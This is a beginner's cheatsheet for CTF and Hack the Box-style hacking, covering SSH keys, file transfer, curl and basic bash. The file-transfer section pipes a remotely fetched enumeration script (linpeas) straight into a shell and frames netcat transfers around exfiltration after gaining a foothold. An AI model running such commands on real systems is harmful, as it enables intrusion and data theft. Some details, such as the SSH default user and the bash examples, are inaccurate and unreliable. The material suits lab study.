# Fundamental Skills
Here are some of the things I consider fundamental to CTFs, Hack the Box-esque challenges, and web hacking.

Skills include knowing how to transfer files between computers, crack passwords, remotely access a machine, run reconnaisance scans, analyse HTTP requests, and script with bash or python.

Each skill links to a more detailed entry in the cheatsheets, and some even have links to practical example where the skills have been used on a box or challenge.

Start here if you are a complete beginner!

## Remote Access to a Computer

### SSH

SSH means 'secure shell', and is one of the most fundamental ways of remotely accessing another computer.

SSH access is controlled by keys, using public-key cryptography.

The SSH protocol also powers many other tools and services, such as [[Linux Networking#Secure Copy|Secure Copy]] and port forwarding.

**Basic Syntax**

```bash
$ ssh [user@]IP_ADDRESS
```

The `user@` portion is optional, and specifies a specific user you would like to connect as. The default is usually `root`, but this can vary depending on a host's ssh config.

#### SSH Keys

SSH keys come as a public-private key pair. This is a cryptographic scheme with many applications, from encryption to verifying identity.

During SSH, keys are used to identify yourself to an SSH server. A server may store a list of **public keys** (commonly in `~.ssh/authorized_keys`), which tells it which matching **private keys** it accepts.

Each SSH client (i.e. connecting computer) has its own **private key**, which it presents to a server. If the private key matches the known public key, the server accepts the connection.

To generate a public-private key pair, use `ssh-keygen`. This will prompt you to add a passphrase to your key, which is recommended for extra security:

```bash
$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/user/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/user/.ssh/id_rsa.
Your public key has been saved in /home/user/.ssh/id_rsa.pub.
...[SSH Fingerprint]...
```

This will create a pair of keys and store them in your `~/.ssh` directory. By default they will be called `id_rsa` (your **private key**) and `id_rsa.pub` (your **public key**).

You can change the name of these keys by specifying the `-f` flag, which also lets you specify where you wish to save them. This is useful if you have multiple keys:

```bash
$ ssh-keygen -f test
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in test.
Your public key has been saved in test.pub.
```

To connect using a private key, use the `-i` flag (remember, *i* for 'identity'):

```bash
$ ssh -i /path/to/private/key [user@]IP_ADDRESS
```

Clients also keep a list of 'known hosts', which tells them which public keys they trust. This prevents a malicious actor impersonating a server you are trying to connect to, for example in a man-in-the-middle (MITM) attack. If you try to connect to a host whose public key has changed since you last connected, a warning will be displayed to let you know.

**Never give away your private key**. It will allow someone to impersonate you, and potentially gain access to your server.

## Filesharing Between Computers

There are many situations when you may want to transfer a file to a remote host. The most common example I can think of is when uploading an enumeration script to a machine you have gained a foothold on.

You may also want to download a file from a remote host - for example, when exfiltrating data or downloading a binary file to see how it works.

### Python Webserver

This is one of the easiest methods of file transfer. It involves starting a basic HTTP server on your machine and using this to serve files to a remote computer.

If you haven't already got it, you'll need to [install python](https://www.python.org/downloads/). You can check if you have it by running `which python` or `which python3` in your terminal. If both come back blank, you don't have it installed correctly.

Once you have Python, start your server:

```bash
$ python3 -m http.server
```

By default, this listens on port 8000. You can change the port by specifying an unused port number after the command:

```bash
$ python3 -m http.server [PORT]
```

If you want to listen on a priveleged port (<1000) you must run with root priveleges. Running on port 80 or 443 is a common use case, as they are the default ports for HTTP/S, and sometimes target machines will only communicate on one of these default ports.

```bash
$ sudo python3 -m http.server 80
```

[[Common Ports|Learn more about ports]]

**Communicating with the Server**

You can then make a request to this server from a remote box. For example, using `curl`:

```bash
$ curl [IP]:[PORT]/example.txt
```

Or `wget`:

```bash
$ wget [IP]:[PORT]/example.txt
```

This will request the file `example.txt` from your host machine, and download it to the box. The choice of command depends on what is installed on the box.

You can also pipe the results of a `curl` directly to a shell. This is useful for running a script such as linpeas.

```bash
$ curl [IP]:[PORT]/linpeas.sh | sh
```

Make sure to kill your server when you are done. It is also good practice to start your server in a directory without any sensitive files in it - just the scripts you want to upload.

See [[Aliases#Useful Aliases|Useful Aliases]] for the `enumserve` alias, which starts a Python Server in a preset directory that is full of juicy scripts.

### Secure Copy

Use secure copy to copy a file to a server you can connect to using SSH:

```bash
$ scp /path/to/local/file [user@][SOURCE_IP]:/path/to/target/destination
```

Or to download a file from a remote host:

```bash
$ scp [user@][SOURCE_IP]:/path/to/target/file /path/to/local/file
```

You can also use the `-i` flag to specify a key to use for authentication.

### Netcat

On the receiving machine, setup a `netcat` listener. This will receive a connection and output the file it is being sent to `/path/to/outfile`

```bash
$ nc -lp [PORT] > /path/to/outfile
```

From the sending machine, send a file to the listener, where `/path/to/infile` is the location of the file:

```bash
$ nc -w3 [IP] [PORT] < /path/to/infile
```

See the [[netcat]] note for more details on this useful tool :)

## Sending HTTP Requests

### Using Curl

Use `curl` to send a simple `GET` request to a URL:

```bash
$ curl [URL]
```

*Note*: you must specify the `http://` or `https://` prefix (i.e. `https://google.com`, not just `google.com`)

Specify an outfile to save the output with the `-o` flag:

```bash
$ curl [URL] -o /path/to/outfile
```

Send a `POST` request with the `-X POST` flag:

```bash
$ curl -X POST [URL]
```

or using the `-d` flag to submit data (which implies `POST`):

```bash
$ curl -d 'key=value' [URL]
```

## Scripting & Programming

### sh/bash

Any command you can run in a unix command line, you can run in a bash script.

To create a bash script, add the `#!/bin/bash` shebang to a file, then write whatever commands you want to the file using a text editor. For example:

```bash
#!/bin/bash
echo '#!/bin/bash' > bash_script
```

contents of `bash_script`:

To execute it, make it executable:

```bash
#!/bin/bash
chmod +x bash_script
```

Then run it:

```bash
#!/bin/bash
bash bash_script
```

**sh**

`sh` scripting is similar, but doesn't require a shebang. Just write commands to any file with the `.sh` extension, and execute the file:

```bash
#!/bin/bash
echo 'ls -la' > list-files.sh
./list-files.sh
```